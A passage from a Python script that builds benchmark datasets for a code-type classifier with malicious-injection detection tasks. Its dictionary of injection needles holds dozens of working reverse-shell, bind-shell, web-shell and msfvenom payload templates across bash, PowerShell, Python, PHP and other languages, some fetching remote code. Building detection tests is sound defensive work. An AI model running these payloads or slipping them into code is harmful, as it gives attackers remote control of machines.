#!/usr/bin/env python3
"""Build curated evaluation datasets from the monitor set.

This script samples fragments and documents from the downloader-produced
monitor split (plus Gemini segmentations) and derives a set of benchmark
tasks covering:

- Pure single-label fragments (baseline accuracy by content type).
- Needle-in-the-haystack injections with multiple size buckets.
- Back-to-back multi-label sequences (pairs and triplets).
- Markdown-flavoured mixtures with optional prose/context blocks.
- Throughput stress datasets targeting fixed byte budgets.
"""

from __future__ import annotations

import argparse
from collections import Counter
import hashlib
import json
import random
import shutil
import string
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Dict, Iterable, List, Mapping, Optional, Sequence, Set, Tuple

import datasets as hfds
import numpy as np
from datasets import Dataset, Features, Value
from datasets import Sequence as SeqFeature
from tqdm.auto import tqdm

REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

TRAIN_ROOT = REPO_ROOT / "train"
if str(TRAIN_ROOT) not in sys.path:
    sys.path.insert(0, str(TRAIN_ROOT))

import utils.config as cfg  # noqa: E402
from utils.monitor_eval import load_monitor_memmaps  # noqa: E402

malicious_injections_to_discover = { 
  "shell": [
    """{shell} -i >& /dev/tcp/{ip}/{port} 0>&1""",
    """0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196""",
    """exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done""",
    """{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5""",
    """{shell} -i >& /dev/udp/{ip}/{port} 0>&1""",
    """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f""",
    """nc {ip} {port} -e {shell}""",
    """nc.exe {ip} {port} -e {shell}""",
    """busybox nc {ip} {port} -e {shell}""",
    """nc -c {shell} {ip} {port}""",
    """ncat {ip} {port} -e {shell}""",
    """ncat.exe {ip} {port} -e {shell}""",
    """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f""",
    """C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null""",
    """rcat connect -s {shell} {ip} {port}""",
    """mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s""",
    """socat TCP:{ip}:{port} EXEC:{shell}""",
    """socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane""",
    """sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'""",
    """TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF""",
    """zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'""",
    """@echo off&cmd /V:ON /C "SET ip={ip}:{port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1" > NUL""",
    """@echo off&cmd /V:ON /C "SET ip={ip}:{port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1" > NUL""",
    """msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe""",
    """msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe""",
    """msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe""",
    """msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe""",
    """msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f jsp -o ./rev.jsp""",
    """msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx""",
    """msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx""",
    """msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf""",
    """msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf""",
    """msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -f python -v notBuf -o shellcode""",
    """msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho""",
    """msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho""",
    """msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho""",
    """msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php""",
    """msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php""",
    """msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp""",
    """msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war""",
    """msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk""",
    """msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk""",
    """msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost={ip} lport={port} -f macho -o payload""",
    """msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw""",
    """msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh""",
    """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc {ip} {port} >/tmp/f""",
    """perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};'""",
    """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>'""",
    """perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");};'""",
    """lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');\"""",
    """lua5.1 -e 'local host, port = "{ip}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()' """,
    """echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e {shell} {ip} {port} 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v""",
    """awk 'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""
  ],

  "python": [
    """export RHOST="{ip}";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")'""",
    """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{shell}")'""",
    """export RHOST="{ip}";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("{shell}")'""",
    """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{shell}")'""",
    """python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")'""",
    """python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();
while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'"""
  ],

  "php": [
    """<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>""",
    """<?=`$_GET[0]`?>""",
    """php -r '$sock=fsockopen("{ip}",{port});exec("{shell} <&3 >&3 2>&3");'""",
    """php -r '$sock=fsockopen("{ip}",{port});shell_exec("{shell} <&3 >&3 2>&3");'""",
    """php -r '$sock=fsockopen("{ip}",{port});system("{shell} <&3 >&3 2>&3");'""",
    """php -r '$sock=fsockopen("{ip}",{port});passthru("{shell} <&3 >&3 2>&3");'""",
    """php -r '$sock=fsockopen("{ip}",{port});`{shell} <&3 >&3 2>&3`;'""",
    """php -r '$sock=fsockopen("{ip}",{port});popen("{shell} <&3 >&3 2>&3", "r");'""",
    """php -r '$sock=fsockopen("{ip}",{port});$proc=proc_open("{shell}", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'""",
    """php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{port});\socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'"""
  ],

  "powershell": [
    """IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}""",
    """$LHOST = "{ip}"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()""",
    """powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"""",
    """powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"""",
    """$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()""",
    """PowerShell #3 (Base64)""",
    """$s='{ip}:{port}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{"Authorization"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}""",
    """add-type @"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='1cdbb583-f96894ff-f99b8edc';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/1cdbb583 -Headers @{"Authorization"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/f96894ff -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/f99b8edc -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}"""
  ],

  "javascript_typescript": [
    """require('child_process').exec('nc -e {shell} {ip} {port}')""",
    """(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("{shell}", []);
    var client = new net.Socket();
    client.connect({port}, "{ip}", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();"""
  ],

  "java": [
    """String host="{ip}";int port={port};String cmd="{shell}";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();""",
    """public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}""",
    """public class shell {
    public static void main(String[] args) {
        ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/{ip}/{port} 0>&1")
            .redirectErrorStream(true);
        try {
            Process p = pb.start();
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}"""
  ],

  "go": [
    """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("{shell}");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""
  ],

  "ruby": [
    """ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{ip}",{port}))'""",
    """ruby -rsocket -e'exit if fork;c=TCPSocket.new("{ip}","{port}");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}" }'"""
  ],

  "csharp": [
    """using System;
using System.Diagnostics;

namespace BackConnect {
  class ReverseBash {
    public static void Main(string[] args) {
      Process proc = new System.Diagnostics.Process();
      proc.StartInfo.FileName = "{shell}";
      proc.StartInfo.Arguments = "-c \\"{shell} -i >& /dev/tcp/{ip}/{port} 0>&1\\"";
      proc.StartInfo.UseShellExecute = false;
      proc.StartInfo.RedirectStandardOutput = true;
      proc.Start();

      while (!proc.StandardOutput.EndOfStream) {
        Console.WriteLine(proc.StandardOutput.ReadLine());
      }
    }
  }
}"""
  ],

  "php": [
    """php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{port});\socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;\$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'"""  # from BindShell section
  ]
}

@dataclass
class Fragment:
    """Represents a single validation fragment available for sampling."""

    lang: str
    content: str
    uid: Optional[str]
    extra_meta: Optional[dict]


@dataclass
class MonitorDoc:
    """Monitor document built from Gemini segmentations or Arrow monitor."""

    declared_lang: str
    content: str
    segments: List[dict]
    uid: Optional[str]
    source: str  # "gemini" or "monitor_arrow"
    extra_meta: Optional[dict]


@dataclass(frozen=True)
class MonitorRegion:
    """Contiguous region sampled from a monitor document with exact labels."""

    anchor_label: str
    content: str
    segments: List[dict]
    source_uid: Optional[str]
    source_declared_lang: str
    source_char_start: int
    source_char_end: int
    anchor_ratio: float
    visible_chars: int
    source_labels: Tuple[str, ...]
    monitor_source: str


@dataclass(frozen=True)
class SnippetInsertion:
    """Concrete snippet insertion applied to a host text window."""

    content: str
    insertion_char: int
    snippet_char_start: int
    snippet_char_end: int
    context_prefix: str
    context_suffix: str
    injection_style: str

NON_ASCII_PLACEHOLDER = "\u00A4"
_VISIBLE_ASCII_MIN = 0x20
_VISIBLE_ASCII_MAX = 0x7E
_ALLOWED_TEXT_CONTROLS = {"\n", "\t"}

_MAX_NEEDLE_COMMENT_RATIO = 0.4
_PAYLOAD_MAX_VISIBLE = 1000
_PAYLOAD_SHELL_CHOICES = ["/bin/bash", "/bin/sh", "/usr/bin/env python3", "/bin/zsh", "powershell", "cmd.exe"]
_MALICIOUS_INSERTION_STYLES = (
    "raw_random",
    "line_or_tab_prefixed",
    "control_wrapped",
)
_PAYLOAD_LINE_PREFIX_CHOICES = ("\n", "\t")
_PAYLOAD_CONTROL_WRAPPERS: Tuple[Tuple[str, str], ...] = (
    ('"', '"'),
    ("'", "'"),
    ("`", "`"),
    ("(", ")"),
    ("[", "]"),
    ("{", "}"),
    ("=", ";"),
    (" = ", ";"),
    ("; ", ";"),
    (" = ", ""),
    ("", ";"),
)
_PROHIBITED_INJECTION_LANGS = {"csv", "json", "yaml", "text", "html"}
_PROHIBITED_MONITOR_DONOR_LANGS = {"text"}
_NEEDLE_DONOR_MIN_VISIBLE_SUPPORT = 100
_NEEDLE_DONOR_MAX_LINE_CANDIDATES_PER_SEGMENT = 8
_MARKDOWN_INLINE_CODE_PROB = 0.25
_MARKDOWN_INLINE_MIN_OPPORTUNITIES = 350
_MARKDOWN_INLINE_MIN_VISIBLE = 16
_MARKDOWN_INLINE_MAX_VISIBLE = 192
_PURE_FRAGMENT_HOST_MIN_RATIO = 0.95
_PURE_FRAGMENT_WINDOW_ATTEMPTS = 24
_MIXED_REGION_MIN_RATIO = 0.70


def _visible_char_count(text: str) -> int:
    """Count printable, non-whitespace characters."""
    return sum(1 for ch in text if ch.isprintable() and not ch.isspace())

def _ascii_letter_count(text: str) -> int:
    """Count only ASCII alphabetic characters."""
    return sum(1 for ch in text if ("a" <= ch <= "z") or ("A" <= ch <= "Z"))

def _normalize_text(text: Optional[str]) -> str:
    if not text:
        return ""
    out_chars: List[str] = []
    for ch in text:
        if ch == "\r":
            ch = "\n"
        code = ord(ch)
        if ch in _ALLOWED_TEXT_CONTROLS or _VISIBLE_ASCII_MIN <= code <= _VISIBLE_ASCII_MAX or ch == NON_ASCII_PLACEHOLDER:
            out_chars.append(ch)
        else:
            out_chars.append(NON_ASCII_PLACEHOLDER)
    return "".join(out_chars)


def _log(msg: str) -> None:
    now = time.strftime("%H:%M:%S")
    print(f"[{now}] {msg}", flush=True)


def _canonical_type(raw: str, known: Set[str], top_level_hint: str | None = None) -> str:
    """
    Canonicalize a raw label into the training label space.

    Mirrors downloader/999_prepare_monitor_set._canonical_type so monitor-based
    evaluation uses the same buckets as training/monitor preprocessing.
    """
    key = (raw or "").strip().lower().replace(" ", "_")
    key = key.replace("-", "_").replace(".", "_")
    if not key and top_level_hint:
        key = top_level_hint

    alias_map = {
        "js": "javascript",
        "jsx": "javascript",
        "tsx": "typescript",
        "ts": "typescript",
        "shell_batchfile": "shell",
        "batchfile": "shell",
        "bat": "shell",
        "cmd": "shell",
        "bash": "shell",
        "sh": "shell",
        "zsh": "shell",
        "ps": "powershell",
        "ps1": "powershell",
        "vb": "visual_basic",
        "vbnet": "visual_basic",
        "vb_net": "visual_basic",
        "visualbasic": "visual_basic",
        "c++": "c_family",
        "cpp": "c_family",
        "c-family": "c_family",
        "cfamily": "c_family",
        "c#": "csharp",
        "c-sharp": "csharp",
        "yml": "yaml",
        "htm": "html",
        "md": "markdown",
        "rst": "restructuredtext",
        "plaintext": "text",
        "plain_text": "text",
    }
    key = alias_map.get(key, key)

    if key.startswith("other_") or key.startswith("discovered_"):
        return "other"

    if "template" in key or key.endswith("_config"):
        return "other"

    # Merge close variants into canonical training buckets
    if key in {"javascript", "typescript"}:
        key = "javascript_typescript"
    if key in {"c", "h"}:
        key = "c_family"
    if key == "makefile":
        return "other"
    if key == "batch":
        key = "shell"

    if key not in known:
        if top_level_hint and top_level_hint in known:
            return top_level_hint
        return "other"
    return key


def _load_val_fragments(
    data_root: Path,
    per_lang_target: int,
    *,
    extra_multiplier: int,
    seed: int,
) -> Dict[str, List[Fragment]]:
    """Load and sample validation fragments per language."""

    out: Dict[str, List[Fragment]] = {}
    missing: List[str] = []
    
    langs = sorted(cfg.LANG2ID.keys())
    _log("📂 Loading validation fragments...")
    for lang in tqdm(langs, desc="Loading languages", unit="lang"):
        path = data_root / "val" / lang / "dataset"
        if not path.exists():
            missing.append(lang)
            continue
        try:
            ds = hfds.load_from_disk(str(path))
        except Exception as exc:  # pragma: no cover - informative logging
            _log(f"⚠️  Failed to load validation dataset for '{lang}': {exc}")
            continue

        if len(ds) == 0:
            _log(f"⚠️  Validation dataset for '{lang}' is empty; skipping.")
            continue

        target = min(len(ds), per_lang_target * max(1, extra_multiplier))
        if target <= 0:
            continue

        seed_offset = seed + cfg.LANG2ID.get(lang, 0)
        sampled = ds.shuffle(seed=seed_offset).select(range(target))
        fragments: List[Fragment] = []
        for row in sampled:
            raw_text = row.get("content")
            text = _normalize_text(raw_text if isinstance(raw_text, str) else "")
            if not text:
                continue
            uid = row.get("uid") if isinstance(row, dict) else None
            extra_meta = {
                k: row[k]
                for k in ("source_repo", "source_repo_path", "source_ext", "license")
                if k in row and isinstance(row[k], str)
            }
            fragments.append(Fragment(lang=lang, content=text, uid=uid, extra_meta=extra_meta or None))

        if not fragments:
            _log(f"⚠️  No usable fragments collected for '{lang}'.")
            continue
        out[lang] = fragments

    if missing:
        _log(
            "⚠️  Missing validation splits for: "
            + ", ".join(sorted(missing))
        )
    return out


def _load_monitor_fragments_and_docs(
    data_root: Path,
    per_lang_target: int,
    *,
    extra_multiplier: int,
    seed: int,
    monitor_seg_root: Path,
) -> Tuple[Dict[str, List[Fragment]], List[MonitorDoc]]:
    """Load monitor data (Gemini segmentations + Arrow monitor) for evaluation.

    Fragments are used for synthetic-style tasks (pure, mal_injection,
    sequence_pair/triplet, throughput). MonitorDoc objects keep full mixed-type
    documents for monitor-based tasks (needles, markdown).
    """

    cfg.update_lang_mappings()
    known_labels: Set[str] = set(cfg.LANG2ID.keys())
    rng = random.Random(seed)

    fragments_by_lang: Dict[str, List[Fragment]] = {}
    monitor_docs: List[MonitorDoc] = []

    # ------------------------------------------------------------------
    # 1) Gemini monitor segmentations
    # ------------------------------------------------------------------
    if monitor_seg_root.exists():
        _log(f"📥 Loading Gemini monitor segmentations from {monitor_seg_root} ...")
        for type_dir in sorted(monitor_seg_root.iterdir()):
            if not type_dir.is_dir():
                continue
            declared_raw = type_dir.name
            declared_lang = _canonical_type(declared_raw, known_labels)
            for path in sorted(type_dir.glob("*.json")):
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        data = json.load(f)
                except Exception as exc:
                    _log(f"⚠️  Skipping unreadable segmentation {path}: {exc}")
                    continue

                segs = data.get("segments") or []
                if not segs:
                    continue

                meta = data.get("metadata") or {}
                purity = meta.get("purity_check") or {}
                classification = meta.get("classification") or {}
                uid = (
                    purity.get("input_sha256")
                    or classification.get("input_sha256")
                    or path.stem
                )

                content_parts: List[str] = []
                doc_segments: List[dict] = []
                cursor = 0
                for seg in segs:
                    text = seg.get("content") or ""
                    text = _clean_snippet_text(text)
                    if not text:
                        continue
                    raw_type = seg.get("type") or declared_raw
                    seg_lang = _canonical_type(raw_type, known_labels, top_level_hint=declared_lang)
                    start = cursor
                    end = start + len(text)
                    cursor = end
                    doc_segments.append(
                        {
                            "label": seg_lang,
                            "char_start": start,
                            "char_end": end,
                        }
                    )
                    content_parts.append(text)

                    frag_meta: Dict[str, Any] = {
                        "monitor_source": "gemini",
                        "declared_type": declared_raw,
                        "file_path": str(path),
                    }
                    fragments_by_lang.setdefault(seg_lang, []).append(
                        Fragment(lang=seg_lang, content=text, uid=uid, extra_meta=frag_meta)
                    )

                if not content_parts or not doc_segments:
                    continue

                doc_content = "".join(content_parts)
                monitor_docs.append(
                    MonitorDoc(
                        declared_lang=declared_lang,
                        content=doc_content,
                        segments=doc_segments,
                        uid=uid,
                        source="gemini",
                        extra_meta=meta or None,
                    )
                )
    else:
        _log(f"⚠️  Gemini monitor segmentations not found at {monitor_seg_root}; skipping.")

    # ------------------------------------------------------------------
    # 2) Arrow monitor datasets (pure files, per type)
    # ------------------------------------------------------------------
    arrow_monitor_root = data_root / "monitor"
    if arrow_monitor_root.exists():
        _log(f"📥 Loading Arrow monitor datasets from {arrow_monitor_root} ...")
        for type_dir in sorted(arrow_monitor_root.iterdir()):
            if not type_dir.is_dir():
                continue
            declared_raw = type_dir.name
            declared_lang = _canonical_type(declared_raw, known_labels)

            ds_path = type_dir / "dataset"
            if not ds_path.exists():
                continue
            try:
                ds = hfds.load_from_disk(str(ds_path))
            except Exception as exc:
                _log(f"⚠️  Failed to load monitor dataset for '{declared_raw}': {exc}")
                continue
            if len(ds) == 0:
                continue

            for row in ds:
                raw_text = row.get("content")
                text = _clean_snippet_text(raw_text if isinstance(raw_text, str) else "")
                if not text:
                    continue
                uid = row.get("uid") if isinstance(row, dict) else None
                extra_meta = {
                    k: row[k]
                    for k in ("source_repo", "source_repo_path", "source_ext", "license")
                    if k in row and isinstance(row[k], str)
                }
                frag_extra = {"monitor_source": "monitor_arrow"}
                if extra_meta:
                    frag_extra.update(extra_meta)
                fragments_by_lang.setdefault(declared_lang, []).append(
                    Fragment(
                        lang=declared_lang,
                        content=text,
                        uid=uid,
                        extra_meta=frag_extra,
                    )
                )
                doc_segments = [
                    {
                        "label": declared_lang,
                        "char_start": 0,
                        "char_end": len(text),
                    }
                ]
                monitor_docs.append(
                    MonitorDoc(
                        declared_lang=declared_lang,
                        content=text,
                        segments=doc_segments,
                        uid=uid,
